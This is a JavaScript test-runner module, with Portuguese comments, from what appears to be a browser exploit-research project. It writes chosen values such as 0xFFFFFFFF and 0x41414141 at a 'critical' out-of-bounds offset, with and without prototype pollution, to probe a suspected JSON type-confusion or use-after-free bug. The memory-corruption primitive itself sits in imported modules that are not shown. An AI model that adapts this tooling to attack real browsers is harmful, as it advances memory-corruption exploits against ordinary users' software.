// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeTypeErrorInvestigationTest, currentCallCount_toJSON_for_typeerror_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';

// Usaremos a toJSON mais simples (Variante D) que apenas retorna undefined,
// já que a lógica interna da toJSON não parecia ser o fator para o TypeError,
// mas sim a sua existência no protótipo.
function toJSON_VariantD_ReturnUndefined_ForValueTests() {
    currentCallCount_toJSON_for_typeerror_test++; // Contador para verificar se foi chamada
    // logS3(`toJSON_VariantD: Chamada ${currentCallCount_toJSON_for_typeerror_test}`, "info");
    // document.title = `toJSON_D Call ${currentCallCount_toJSON_for_typeerror_test}`; // Canary opcional
    return undefined;
}


async function runValueAndOffsetDiagnostics() {
    const FNAME_RUNNER = "runValueAndOffsetDiagnostics";
    logS3(`==== INICIANDO Diagnóstico de Valores em Offset 0x70 e Offset Seguro ====`, 'test', FNAME_RUNNER);

    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const safeOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + 100; // Ex: 0xE4 se BASE_OFFSET_DV = 128

    const valuesToTestAtCriticalOffset = [
        { desc: "Val_FFFF", val: 0xFFFFFFFF },
        { desc: "Val_0000", val: 0x00000000 },
        { desc: "Val_AAAA", val: 0x41414141 },
        { desc: "Val_0001", val: 0x00000001 }, // Um valor pequeno
    ];

    // Testar diferentes valores no offset crítico 0x70 (COM PP)
    logS3(`\n--- Testando Valores no Offset Crítico ${toHex(criticalOffset)} (COM PP) ---`, 'subtest', FNAME_RUNNER);
    for (const valueTest of valuesToTestAtCriticalOffset) {
        const testDescription = `ValTest_${valueTest.desc}_Offset0x70_COM_PP`;
        await executeTypeErrorInvestigationTest(
            testDescription,
            true, // applyPrototypePollution
            toJSON_VariantD_ReturnUndefined_ForValueTests,
            criticalOffset,
            valueTest.val
        );
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
    }

    // Teste de Controle: Escrita de 0xFFFFFFFF em offset "seguro" (COM PP)
    const testDescriptionSafeOffset = `ValTest_Val_FFFF_OffsetSeguro_${toHex(safeOffset)}_COM_PP`;
    logS3(`\n--- Testando Valor FFFF no Offset Seguro ${toHex(safeOffset)} (COM PP) ---`, 'subtest', FNAME_RUNNER);
    await executeTypeErrorInvestigationTest(
        testDescriptionSafeOffset,
        true, // applyPrototypePollution
        toJSON_VariantD_ReturnUndefined_ForValueTests,
        safeOffset,
        0xFFFFFFFF // Valor problemático, mas em offset seguro
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`   Título da página após teste ${testDescriptionSafeOffset}: ${document.title}`, "info");

    // Teste de Controle: Escrita de 0xFFFFFFFF no offset crítico 0x70 (SEM PP)
    const testDescriptionNoPP = `ValTest_Val_FFFF_Offset0x70_SEM_PP`;
    logS3(`\n--- Testando Valor FFFF no Offset Crítico ${toHex(criticalOffset)} (SEM PP) ---`, 'subtest', FNAME_RUNNER);
    await executeTypeErrorInvestigationTest(
        testDescriptionNoPP,
        false, // applyPrototypePollution = false
        null,  // toJSONFunctionToUse (não será usada)
        criticalOffset,
        0xFFFFFFFF
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`   Título da página após teste ${testDescriptionNoPP}: ${document.title}`, "info");


    logS3(`==== Diagnóstico de Valores e Offsets CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_ValueOffsetDiag';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Diagnóstico de Valores em Offsets Específicos ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Diagnóstico Valores/Offsets";
    
    await runValueAndOffsetDiagnostics();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Diagnóstico de Valores em Offsets Específicos) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
